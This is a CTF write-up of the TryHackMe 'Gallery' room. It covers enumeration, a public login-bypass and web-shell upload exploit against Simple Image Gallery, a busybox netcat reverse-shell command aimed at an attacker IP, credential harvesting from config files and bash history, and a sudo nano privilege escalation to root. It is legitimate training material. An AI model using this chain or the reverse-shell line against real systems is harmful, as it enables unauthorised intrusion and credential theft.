---
title: "Gallery"
date: 2025-01-30
image: /assets/img/tryhackme/Gallery/Gallery_image.jpg
description: Writeup of the TryHackMe-CTF Gallery
categories: [Tryhackme, Easy]
tags: [linux, privesc, web, enumeration, rce]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Gallery</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Try to exploit our image gallery system</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/r/room/gallery666">https://tryhackme.com/r/room/gallery666</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Gallery.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.180.20                                
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 06:17 EST
  Nmap scan report for 10.10.180.20
  Host is up (0.039s latency).
  Not shown: 65533 closed tcp ports (conn-refused)
  PORT     STATE SERVICE
  80/tcp   open  http
  8080/tcp open  http-proxy

  Nmap done: 1 IP address (1 host up) scanned in 19.85 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 80,8080 10.10.180.20
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 06:18 EST
  Nmap scan report for 10.10.180.20
  Host is up (0.045s latency).
  
  PORT     STATE SERVICE VERSION
  80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  |_http-title: Apache2 Ubuntu Default Page: It works
  8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  | http-open-proxy: Potentially OPEN proxy.
  |_Methods supported:CONNECTION
  | http-cookie-flags: 
  |   /: 
  |     PHPSESSID: 
  |_      httponly flag not set
  |_http-title: Simple Image Gallery System
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 8.35 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis
I found an Apache default page, but found nothing in the source code, so I continued with the directory enumeration:
```bash
$ gobuster dir --url http://10.10.180.20/ --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.180.20/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /gallery              (Status: 301) [Size: 314] [--> http://10.10.180.20/gallery/]

```

The directory `/gallery` showed a Login screen. With the name of the CMS I found an <a href="https://www.exploit-db.com/exploits/50214">exploit-db</a> entry which can get me remote code execution. The exploit code shows how to bypass the login, but after logging in this didn't reveal anything.

![Dashboard](/assets/img/tryhackme/Gallery/thm_gallery_1.jpg)

```bash
$ python3 exploit.py
TARGET = http://10.10.180.20/gallery              
Login Bypass
shell name TagoenmcpbdzviklgpmLetta

protecting user

User ID : 1
Firstname : Adminstrator
Lastname : Admin
Username : admin

shell uploading
- OK -
Shell URL : http://10.10.180.20/gallery/uploads/1738236540_TagoenmcpbdzviklgpmLetta.php?cmd=whoami

```
![Remote Command Execution](/assets/img/tryhackme/Gallery/thm_gallery_2.jpg)

I was able to get a reverse shell shell:
```html
...?cmd=busybox nc [atacker ip] 9001 -e sh
```
After performing some shell stabilization I started searching for database credentials and found a file called `initialize.php`:
```php
<?php
  $dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'[removed]','last_login'=>'','date_updated'=>'','date_added'=>'');

  if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
  if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
  if(!defined('dev_data')) define('dev_data',$dev_data);
  if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
  if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
  if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"[removed]");
  if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
?>
```

With the credentials I was able to access the MySql database:
```bash
www-data@gallery:/var/www/html/gallery$ mysql -u gallery_user -p

MariaDB [(none)]> show databases;
  +--------------------+
  | Database           |
  +--------------------+
  | gallery_db         |
  | information_schema |
  +--------------------+
  2 rows in set (0.00 sec)

MariaDB [(none)]> use gallery_db;
	Database changed

MariaDB [gallery_db]> show tables;
  +----------------------+
  | Tables_in_gallery_db |
  +----------------------+
  | album_list           |
  | images               |
  | system_info          |
  | users                |
  +----------------------+
  4 rows in set (0.00 sec)

MariaDB [gallery_db]> select * from users; 
  +----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
  | id | firstname    | lastname | username | password                         | avatar                                          | last_login | type | date_added          | date_updated        |
  +----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
  |  1 | Adminstrator | Admin    | admin    | [removed]                        | uploads/1738236540_TagoenmcpbdzviklgpmLetta.php | NULL       |    1 | 2021-01-20 14:02:37 | 2025-01-30 11:29:27 |
  +----+--------------+----------+----------+----------------------------------+-------------------------------------------------+------------+------+---------------------+---------------------+
1 row in set (0.00 sec)
```

## Privilege Escalation mike

After searching around a bit I found a backup of the bash history at this path `/var/backups/mike_home_backup/.bash_history`. In the file I found the following:
```bash
$ cat .bash_history
  cat .bash_history
  cd ~
  ls
  ping 1.1.1.1
  cat /home/mike/user.txt
  cd /var/www/
  ls
  cd html
  ls -al
  cat index.html
  sudo -l[removed]
  clear
  sudo -l
  exit
```

This looks like mike's credentials, so I changed the user:
```bash
mike@gallery:~$ su mike
  su mike
  Password: [removed]

mike@gallery:~$ cat user.txt
	[*** removed ***]
```

## Privilege Escalation root
I started with `sudo -l` and got the following output:
```bash
mike@gallery:~$ sudo -l
  Matching Defaults entries for mike on gallery:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User mike may run the following commands on gallery:
      (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```
We can execute the `bash` script as root. Let's analyse the bash script:
```bash
  #!/bin/bash

  read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

  # Execute your choice
  case $ans in
      versioncheck)
          /usr/bin/rkhunter --versioncheck ;;
      update)
          /usr/bin/rkhunter --update;;
      list)
          /usr/bin/rkhunter --list;;
      read)
          /bin/nano /root/report.txt;;
      *)
          exit;;
  esac
```
A quick search in <a href="https://gtfobins.github.io/gtfobins/nano/">gftobins</a> gave me all I needed. We can insert `read` to get inside the nano command. From there we can get a shell.
```bash
mike@gallery:~$ sudo /bin/bash /opt/rootkit.sh
  Would you like to versioncheck, update, list or read the report ? read
```
In `nano` press CTRL + R then CTRL + X and insert the command:

![nano privesc](/assets/img/tryhackme/Gallery/thm_gallery_3.jpg)

```bash
# whoami
  root
# cat /root/root.txt
  [*** removed ***]
```

solved! :)
